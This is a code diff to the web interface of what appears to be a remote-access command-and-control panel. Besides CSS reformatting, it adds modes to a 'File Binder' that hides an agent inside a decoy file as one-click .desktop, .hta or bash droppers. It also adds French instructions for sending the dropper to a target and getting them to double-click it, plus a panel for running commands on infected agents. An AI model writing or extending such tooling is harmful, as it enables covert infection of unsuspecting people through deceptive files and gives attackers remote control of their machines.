@@ -32,12 +32,22 @@
                 radial-gradient(circle at 85% 30%, rgba(16, 185, 129, 0.15), transparent 25%);
         }
 
-        .container { max-width: 1200px; margin: 0 auto; }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
 
-        header { margin-bottom: 2rem; display: flex; align-items: center; gap: 1rem; }
+        header {
+            margin-bottom: 2rem;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
 
         h1 {
-            font-size: 2rem; font-weight: 700; margin: 0;
+            font-size: 2rem;
+            font-weight: 700;
+            margin: 0;
             background: linear-gradient(135deg, #60a5fa, #a78bfa);
             -webkit-background-clip: text;
             background-clip: text;
@@ -67,100 +77,223 @@
         }
 
         .card h2 {
-            font-size: 1.25rem; margin-top: 0; margin-bottom: 1.25rem;
-            border-bottom: 1px solid var(--border-color); padding-bottom: 0.75rem;
-            display: flex; align-items: center; justify-content: space-between;
+            font-size: 1.25rem;
+            margin-top: 0;
+            margin-bottom: 1.25rem;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 0.75rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
         }
 
         .status-badge {
-            display: inline-flex; align-items: center; gap: 0.5rem;
-            padding: 0.25rem 0.75rem; border-radius: 9999px; font-size: 0.875rem;
-            font-weight: 500; background: rgba(255, 255, 255, 0.05);
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.25rem 0.75rem;
+            border-radius: 9999px;
+            font-size: 0.875rem;
+            font-weight: 500;
+            background: rgba(255, 255, 255, 0.05);
         }
 
         .status-dot {
-            width: 8px; height: 8px; border-radius: 50%;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
             background-color: var(--text-muted);
         }
-        .status-dot.active { background-color: var(--success); box-shadow: 0 0 8px var(--success); }
-        .status-dot.inactive { background-color: var(--danger); }
+
+        .status-dot.active {
+            background-color: var(--success);
+            box-shadow: 0 0 8px var(--success);
+        }
+
+        .status-dot.inactive {
+            background-color: var(--danger);
+        }
 
         .btn {
-            background: var(--primary); color: white; border: none;
-            padding: 0.5rem 1rem; border-radius: 8px; font-size: 0.875rem;
-            font-weight: 500; cursor: pointer; transition: all 0.2s; font-family: inherit;
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 8px;
+            font-size: 0.875rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-family: inherit;
         }
-        .btn:hover { background: var(--primary-hover); }
-        .btn:active { transform: translateY(1px); }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        .btn-danger { background: var(--danger); }
-        .btn-danger:hover { background: var(--danger-hover); }
-        .btn-success { background: var(--success); }
-        .btn-success:hover { background: #059669; }
 
-        .form-group { margin-bottom: 1rem; }
+        .btn:hover {
+            background: var(--primary-hover);
+        }
+
+        .btn:active {
+            transform: translateY(1px);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .btn-danger {
+            background: var(--danger);
+        }
+
+        .btn-danger:hover {
+            background: var(--danger-hover);
+        }
+
+        .btn-success {
+            background: var(--success);
+        }
+
+        .btn-success:hover {
+            background: #059669;
+        }
+
+        .form-group {
+            margin-bottom: 1rem;
+        }
 
         label {
-            display: block; margin-bottom: 0.5rem;
-            font-size: 0.875rem; color: var(--text-muted);
+            display: block;
+            margin-bottom: 0.5rem;
+            font-size: 0.875rem;
+            color: var(--text-muted);
         }
 
-        select, input[type="text"], input[type="file"] {
-            width: 100%; background: rgba(0, 0, 0, 0.2);
-            border: 1px solid var(--border-color); color: white;
-            padding: 0.625rem; border-radius: 8px; font-family: inherit;
-            box-sizing: border-box; outline: none; transition: border-color 0.2s;
+        select,
+        input[type="text"],
+        input[type="file"] {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid var(--border-color);
+            color: white;
+            padding: 0.625rem;
+            border-radius: 8px;
+            font-family: inherit;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.2s;
         }
-        select:focus, input[type="text"]:focus, input[type="file"]:focus {
+
+        select:focus,
+        input[type="text"]:focus,
+        input[type="file"]:focus {
             border-color: var(--primary);
         }
-        input[type="file"] { cursor: pointer; }
+
+        input[type="file"] {
+            cursor: pointer;
+        }
+
         input[type="file"]::file-selector-button {
-            background: var(--primary); color: white; border: none;
-            padding: 0.3rem 0.75rem; border-radius: 6px; cursor: pointer;
-            margin-right: 0.75rem; font-family: inherit; font-size: 0.875rem;
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 0.3rem 0.75rem;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-right: 0.75rem;
+            font-family: inherit;
+            font-size: 0.875rem;
         }
 
         .terminal {
-            background: #000000; border-radius: 8px; padding: 1rem;
-            font-family: 'Consolas', 'Monaco', monospace; font-size: 0.875rem;
-            color: #10b981; height: 150px; overflow-y: auto; margin-top: 1rem;
-            white-space: pre-wrap; border: 1px solid var(--border-color);
+            background: #000000;
+            border-radius: 8px;
+            padding: 1rem;
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 0.875rem;
+            color: #10b981;
+            height: 150px;
+            overflow-y: auto;
+            margin-top: 1rem;
+            white-space: pre-wrap;
+            border: 1px solid var(--border-color);
         }
 
         /* Agent table */
         .agents-table {
-            width: 100%; border-collapse: collapse; font-size: 0.8rem;
-            max-height: 250px; display: block; overflow-y: auto;
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.8rem;
+            max-height: 250px;
+            display: block;
+            overflow-y: auto;
         }
+
         .agents-table th {
-            text-align: left; padding: 0.5rem 0.75rem;
-            color: var(--text-muted); border-bottom: 1px solid var(--border-color);
-            position: sticky; top:0; background: var(--card-bg);
+            text-align: left;
+            padding: 0.5rem 0.75rem;
+            color: var(--text-muted);
+            border-bottom: 1px solid var(--border-color);
+            position: sticky;
+            top: 0;
+            background: var(--card-bg);
         }
+
         .agents-table td {
-            padding: 0.5rem 0.75rem; border-bottom: 1px solid rgba(255,255,255,0.05);
+            padding: 0.5rem 0.75rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
         }
-        .agents-table tr.clickable { cursor: pointer; }
-        .agents-table tr.clickable:hover { background: rgba(59, 130, 246, 0.1); }
+
+        .agents-table tr.clickable {
+            cursor: pointer;
+        }
+
+        .agents-table tr.clickable:hover {
+            background: rgba(59, 130, 246, 0.1);
+        }
 
         .badge-online {
-            background: rgba(16, 185, 129, 0.15); color: var(--success);
-            padding: 0.1rem 0.5rem; border-radius: 9999px; font-size: 0.75rem;
+            background: rgba(16, 185, 129, 0.15);
+            color: var(--success);
+            padding: 0.1rem 0.5rem;
+            border-radius: 9999px;
+            font-size: 0.75rem;
         }
 
-        .flex-row { display: flex; gap: 0.5rem; }
-        .mt-4 { margin-top: 1rem; }
+        .flex-row {
+            display: flex;
+            gap: 0.5rem;
+        }
+
+        .mt-4 {
+            margin-top: 1rem;
+        }
 
         /* Loading animation */
         .loader {
-            border: 2px solid rgba(255, 255, 255, 0.1); border-left-color: var(--primary);
-            border-radius: 50%; width: 16px; height: 16px;
-            animation: spin 1s linear infinite; display: none;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-left-color: var(--primary);
+            border-radius: 50%;
+            width: 16px;
+            height: 16px;
+            animation: spin 1s linear infinite;
+            display: none;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .info-text { font-size: 0.8rem; color: var(--text-muted); margin-top: 0.5rem; }
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .info-text {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            margin-top: 0.5rem;
+        }
     </style>
 </head>
 
@@ -180,7 +313,8 @@
                 </h2>
                 <div class="flex-row">
                     <button class="btn" id="startServerBtn" onclick="startServer()">Start Server</button>
-                    <button class="btn btn-danger" id="stopServerBtn" onclick="stopServer()" disabled>Stop Server</button>
+                    <button class="btn btn-danger" id="stopServerBtn" onclick="stopServer()" disabled>Stop
+                        Server</button>
                 </div>
                 <div class="terminal mt-4" style="height: 80px;">
                     Server logs managed by Python backend. Start the server above.
@@ -189,7 +323,8 @@
 
             <!-- Agent Builder Card -->
             <div class="card">
-                <h2>Agent Builder <div class="loader" id="buildLoader"></div></h2>
+                <h2>Agent Builder <div class="loader" id="buildLoader"></div>
+                </h2>
                 <div class="form-group">
                     <label for="buildTarget">Target Architecture</label>
                     <select id="buildTarget">
@@ -209,7 +344,8 @@
             <!-- Active Agents Card -->
             <div class="card">
                 <h2>Active Agents
-                    <button class="btn" style="padding: 0.25rem 0.5rem; font-size: 0.75rem;" onclick="refreshAgents()">Refresh</button>
+                    <button class="btn" style="padding: 0.25rem 0.5rem; font-size: 0.75rem;"
+                        onclick="refreshAgents()">Refresh</button>
                 </h2>
                 <table class="agents-table" id="agentsTable">
                     <thead>
@@ -221,15 +357,28 @@
                         </tr>
                     </thead>
                     <tbody id="agentsTbody">
-                        <tr><td colspan="4" style="color:var(--text-muted); text-align:center; padding:1rem;">No agents found.</td></tr>
+                        <tr>
+                            <td colspan="4" style="color:var(--text-muted); text-align:center; padding:1rem;">No agents
+                                found.</td>
+                        </tr>
                     </tbody>
                 </table>
             </div>
 
             <!-- File Binder Card -->
             <div class="card">
-                <h2>File Binder <div class="loader" id="binderLoader"></div></h2>
-                <p class="info-text">Combine ton agent avec un fichier leurre. En l'exécutant (<code>./fichier</code> ou <code>bash fichier</code>) l'agent démarre en arrière-plan et le leurre s'ouvre normalement.</p>
+                <h2>File Binder <div class="loader" id="binderLoader"></div>
+                </h2>
+                <p class="info-text">Combine ton agent avec un fichier leurre. Choisis le mode selon l'OS cible.</p>
+                <div class="form-group">
+                    <label for="binderMode">Mode de génération</label>
+                    <select id="binderMode" onchange="updateBinderHint()">
+                        <option value="desktop">🐧 Linux — 1 clic (.desktop) — double-clic dans le gestionnaire de
+                            fichiers</option>
+                        <option value="hta">🪟 Windows — 1 clic (.hta) — double-clic dans l'explorateur</option>
+                        <option value="bash">📜 Bash Script — exécution manuelle (bash fichier)</option>
+                    </select>
+                </div>
                 <div class="form-group">
                     <label for="binderDecoy">Fichier leurre (n'importe quelle extension)</label>
                     <input type="file" id="binderDecoy">
@@ -241,12 +390,16 @@
                     </select>
                 </div>
                 <button class="btn btn-success" onclick="generateBinder()" id="binderBtn">Générer le Dropper</button>
+                <div class="info-text" id="binderHint" style="margin-top:0.5rem; color:#a78bfa;">
+                    ✅ Le fichier généré s'exécute en 1 double-clic sur Linux (GNOME/KDE)
+                </div>
                 <div class="terminal" id="binderTerminal">En attente...</div>
             </div>
 
             <!-- Command Execution Card -->
             <div class="card">
-                <h2>Execute Command <div class="loader" id="execLoader"></div></h2>
+                <h2>Execute Command <div class="loader" id="execLoader"></div>
+                </h2>
                 <div class="form-group">
                     <label for="targetAgent">Target Agent ID</label>
                     <select id="targetAgent">
@@ -417,9 +570,22 @@
             }
         }
 
+        function updateBinderHint() {
+            const mode = document.getElementById('binderMode').value;
+            const hint = document.getElementById('binderHint');
+            if (mode === 'desktop') {
+                hint.innerHTML = '✅ <strong>Linux 1-clic</strong> — Double-clic dans GNOME/KDE. Le fichier aura l\'extension <code>.desktop</code>. Pour le distribuer via SSH/email, la cible n\'a qu\'à double-cliquer dessus.';
+            } else if (mode === 'hta') {
+                hint.innerHTML = '✅ <strong>Windows 1-clic</strong> — Double-clic dans l\'Explorateur. Le fichier aura l\'extension <code>.hta</code>. Fonctionne sur toutes les versions Windows avec MSHTA.';
+            } else {
+                hint.innerHTML = '📜 <strong>Bash Script</strong> — Nécessite <code>bash fichier</code> ou <code>chmod +x && ./fichier</code>. Le fichier garde l\'extension du leurre.';
+            }
+        }
+
         async function generateBinder() {
             const decoyInput = document.getElementById('binderDecoy');
             const agentSel = document.getElementById('binderAgent');
+            const modeSel = document.getElementById('binderMode');
             const term = document.getElementById('binderTerminal');
             const btn = document.getElementById('binderBtn');
             const loader = document.getElementById('binderLoader');
@@ -433,6 +599,8 @@
                 return;
             }
 
+            const mode = modeSel.value;
+            const decoyName = decoyInput.files[0].name;
             term.innerHTML = '<span style="color:#f59e0b">Génération du dropper en cours...</span>';
             btn.disabled = true;
             loader.style.display = 'inline-block';
@@ -441,11 +609,9 @@
                 const formData = new FormData();
                 formData.append('decoy', decoyInput.files[0]);
                 formData.append('agent', agentSel.value);
+                formData.append('mode', mode);
 
-                const res = await fetch(`${API}/binder/create`, {
-                    method: 'POST',
-                    body: formData
-                });
+                const res = await fetch(`${API}/binder/create`, { method: 'POST', body: formData });
 
                 if (!res.ok) {
                     const err = await res.json();
@@ -453,20 +619,30 @@
                     return;
                 }
 
-                // Trigger file download
+                // Determine downloaded filename from response header or build it
+                const contentDisp = res.headers.get('Content-Disposition') || '';
+                let dlName = decoyName;
+                const fnMatch = contentDisp.match(/filename="?([^"]+)"?/);
+                if (fnMatch) dlName = fnMatch[1];
+
                 const blob = await res.blob();
                 const url = URL.createObjectURL(blob);
                 const a = document.createElement('a');
-                a.href = url;
-                a.download = decoyInput.files[0].name;
-                document.body.appendChild(a);
-                a.click();
+                a.href = url; a.download = dlName;
+                document.body.appendChild(a); a.click();
                 document.body.removeChild(a);
                 URL.revokeObjectURL(url);
 
-                term.innerHTML = `<span style="color:#10b981">✅ Dropper généré ! Fichier téléchargé : <strong>${decoyInput.files[0].name}</strong>
-Exécute-le sur la cible avec : <code>chmod +x ${decoyInput.files[0].name} && ./${decoyInput.files[0].name}</code>
-ou : <code>bash ${decoyInput.files[0].name}</code></span>`;
+                let instructions = '';
+                if (mode === 'desktop') {
+                    instructions = `Sur la cible Linux : copie <strong>${dlName}</strong> et double-clique dessus dans le gestionnaire de fichiers (GNOME/KDE).<br>Si rien ne se passe, fais clic-droit → <em>Propriétés → Permissions → Autoriser l'exécution</em>.`;
+                } else if (mode === 'hta') {
+                    instructions = `Sur la cible Windows : envoie <strong>${dlName}</strong> et dis à la cible de double-cliquer dessus. Windows lancera MSHTA automatiquement.`;
+                } else {
+                    instructions = `Sur la cible Linux : <code>chmod +x ${dlName} && ./${dlName}</code> ou <code>bash ${dlName}</code>`;
+                }
+
+                term.innerHTML = `<span style="color:#10b981">✅ Dropper généré : <strong>${dlName}</strong><br><br>${instructions}</span>`;
             } catch (e) {
                 term.innerHTML = `<span style="color:#ef4444">Erreur réseau: ${e.message}</span>`;
             } finally {
@@ -485,7 +661,7 @@ ou : <code>bash ${decoyInput.files[0].name}</code></span>`;
 
             if (!agent_id || !command) return;
 
-            term.innerHTML = `<span style="color:#f59e0b">Sending command to ${agent_id.substring(0,8)}...</span>`;
+            term.innerHTML = `<span style="color:#f59e0b">Sending command to ${agent_id.substring(0, 8)}...</span>`;
             btn.disabled = true;
             loader.style.display = 'inline-block';
 
